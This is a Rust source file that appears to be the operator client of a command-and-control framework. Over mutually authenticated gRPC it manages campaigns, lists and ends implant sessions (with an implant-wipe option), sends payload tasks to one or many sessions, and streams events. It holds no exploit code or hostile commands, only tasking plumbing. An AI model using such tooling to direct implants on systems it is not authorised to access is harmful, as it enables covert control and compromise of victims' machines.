use tonic::transport::{Channel, ClientTlsConfig, Identity, Certificate};
use std::path::PathBuf;
use std::sync::Arc;
use tokio::sync::Mutex;
use tokio_stream::StreamExt;

pub mod proto {
    tonic::include_proto!("oblivion.operator");
}

use proto::operator_client::OperatorClient;
use proto::*;

#[derive(Clone)]
pub struct GrpcClient {
    inner: OperatorClient<Channel>,
    operator_id: String,
}

impl GrpcClient {
    pub async fn connect(
        address: &str,
        operator_id: String,
        client_cert: Option<PathBuf>,
        client_key: Option<PathBuf>,
        ca_cert: Option<PathBuf>,
    ) -> anyhow::Result<Self> {
        let tls_config = Self::build_tls_config(client_cert, client_key, ca_cert).await?;
        
        let channel = Channel::from_shared(address.to_string())?
            .tls_config(tls_config)?
            .connect()
            .await?;
        
        let inner = OperatorClient::new(channel);
        
        Ok(Self { inner, operator_id })
    }
    
    async fn build_tls_config(
        client_cert: Option<PathBuf>,
        client_key: Option<PathBuf>,
        ca_cert: Option<PathBuf>,
    ) -> anyhow::Result<ClientTlsConfig> {
        let mut config = ClientTlsConfig::new();
        
        if let (Some(cert_path), Some(key_path)) = (client_cert, client_key) {
            let cert = tokio::fs::read(cert_path).await?;
            let key = tokio::fs::read(key_path).await?;
            let identity = Identity::from_pem(cert, key);
            config = config.identity(identity);
        }
        
        if let Some(ca_path) = ca_cert {
            let ca = tokio::fs::read(ca_path).await?;
            let ca_cert = Certificate::from_pem(ca);
            config = config.ca_certificate(ca_cert);
        }
        
        Ok(config)
    }
    
    // Campaign Operations
    pub async fn create_campaign(
        &mut self,
        name: String,
        description: Option<String>,
    ) -> anyhow::Result<Campaign> {
        let request = tonic::Request::new(CreateCampaignRequest {
            name,
            description: description.unwrap_or_default(),
            metadata: None,
        });
        
        // Add operator ID to metadata
        let mut request = request;
        request.metadata_mut().insert(
            "operator-id",
            tonic::metadata::MetadataValue::try_from(self.operator_id.clone())?,
        );
        
        let response = self.inner.create_campaign(request).await?;
        Ok(response.into_inner())
    }
    
    pub async fn list_campaigns(&mut self) -> anyhow::Result<Vec<Campaign>> {
        let request = tonic::Request::new(ListCampaignsRequest {
            include_archived: false,
        });
        
        let mut request = request;
        request.metadata_mut().insert(
            "operator-id",
            tonic::metadata::MetadataValue::try_from(self.operator_id.clone())?,
        );
        
        let response = self.inner.list_campaigns(request).await?;
        Ok(response.into_inner().campaigns)
    }
    
    pub async fn get_campaign_details(
        &mut self,
        campaign_id: String,
    ) -> anyhow::Result<CampaignDetails> {
        let request = tonic::Request::new(GetCampaignRequest { campaign_id });
        
        let mut request = request;
        request.metadata_mut().insert(
            "operator-id",
            tonic::metadata::MetadataValue::try_from(self.operator_id.clone())?,
        );
        
        let response = self.inner.get_campaign(request).await?;
        Ok(response.into_inner())
    }
    
    pub async fn control_campaign(
        &mut self,
        campaign_id: String,
        action: CampaignAction,
    ) -> anyhow::Result<bool> {
        let request = tonic::Request::new(ControlCampaignRequest {
            campaign_id,
            action: action as i32,
        });
        
        let mut request = request;
        request.metadata_mut().insert(
            "operator-id",
            tonic::metadata::MetadataValue::try_from(self.operator_id.clone())?,
        );
        
        let response = self.inner.control_campaign(request).await?;
        Ok(response.into_inner().success)
    }
    
    // Session Operations
    pub async fn list_sessions(
        &mut self,
        campaign_id: String,
    ) -> anyhow::Result<Vec<Session>> {
        let request = tonic::Request::new(ListSessionsRequest {
            campaign_id,
            status_filter: -1, // All
        });
        
        let mut request = request;
        request.metadata_mut().insert(
            "operator-id",
            tonic::metadata::MetadataValue::try_from(self.operator_id.clone())?,
        );
        
        let response = self.inner.list_sessions(request).await?;
        Ok(response.into_inner().sessions)
    }
    
    pub async fn terminate_session(
        &mut self,
        session_id: String,
        wipe: bool,
    ) -> anyhow::Result<bool> {
        let request = tonic::Request::new(TerminateSessionRequest {
            session_id,
            wipe_implant: wipe,
        });
        
        let mut request = request;
        request.metadata_mut().insert(
            "operator-id",
            tonic::metadata::MetadataValue::try_from(self.operator_id.clone())?,
        );
        
        let response = self.inner.terminate_session(request).await?;
        Ok(response.into_inner().success)
    }
    
    // Task Operations
    pub async fn create_task(
        &mut self,
        campaign_id: String,
        session_id: String,
        task_type: TaskType,
        payload: Vec<u8>,
        timeout: u32,
    ) -> anyhow::Result<u64> {
        let request = tonic::Request::new(CreateTaskRequest {
            campaign_id,
            session_id,
            task_type: task_type as i32,
            payload,
            timeout_seconds: timeout,
        });
        
        let mut request = request;
        request.metadata_mut().insert(
            "operator-id",
            tonic::metadata::MetadataValue::try_from(self.operator_id.clone())?,
        );
        
        let response = self.inner.create_task(request).await?;
        Ok(response.into_inner().task_id)
    }
    
    pub async fn create_broadcast_task(
        &mut self,
        campaign_id: String,
        session_ids: Vec<String>,
        task_type: TaskType,
        payload: Vec<u8>,
        timeout: u32,
    ) -> anyhow::Result<Vec<u64>> {
        let request = tonic::Request::new(CreateBroadcastTaskRequest {
            campaign_id,
            session_ids,
            task_type: task_type as i32,
            payload,
            timeout_seconds: timeout,
        });
        
        let mut request = request;
        request.metadata_mut().insert(
            "operator-id",
            tonic::metadata::MetadataValue::try_from(self.operator_id.clone())?,
        );
        
        let response = self.inner.create_broadcast_task(request).await?;
        Ok(response.into_inner().task_ids)
    }
    
    pub async fn get_task_result(
        &mut self,
        task_id: u64,
    ) -> anyhow::Result<TaskResult> {
        let request = tonic::Request::new(GetTaskResultRequest { task_id });
        
        let mut request = request;
        request.metadata_mut().insert(
            "operator-id",
            tonic::metadata::MetadataValue::try_from(self.operator_id.clone())?,
        );
        
        let response = self.inner.get_task_result(request).await?;
        Ok(response.into_inner())
    }
    
    // Event Streaming
    pub async fn subscribe_events(
        &mut self,
        campaign_id: String,
    ) -> anyhow::Result<tokio::sync::mpsc::Receiver<crate::state::Event>> {
        let request = tonic::Request::new(SubscribeEventsRequest { campaign_id });
        
        let mut request = request;
        request.metadata_mut().insert(
            "operator-id",
            tonic::metadata::MetadataValue::try_from(self.operator_id.clone())?,
        );
        
        let mut stream = self.inner.subscribe_events(request).await?.into_inner();
        
        let (tx, rx) = tokio::sync::mpsc::channel(100);
        
        tokio::spawn(async move {
            while let Some(event) = stream.next().await {
                match event {
                    Ok(e) => {
                        let event = crate::state::Event {
                            event_type: format!("{:?}", e.event_type()),
                            data: serde_json::to_value(&e).unwrap_or_default(),
                            timestamp: e.timestamp,
                        };
                        if tx.send(event).await.is_err() {
                            break;
                        }
                    }
                    Err(e) => {
                        tracing::error!("Event stream error: {}", e);
                        break;
                    }
                }
            }
        });
        
        Ok(rx)
    }
    
    // Server Stats
    pub async fn get_server_stats(&mut self) -> anyhow::Result<ServerStats> {
        let request = tonic::Request::new(GetServerStatsRequest {});
        
        let mut request = request;
        request.metadata_mut().insert(
            "operator-id",
            tonic::metadata::MetadataValue::try_from(self.operator_id.clone())?,
        );
        
        let response = self.inner.get_server_stats(request).await?;
        Ok(response.into_inner())
    }
}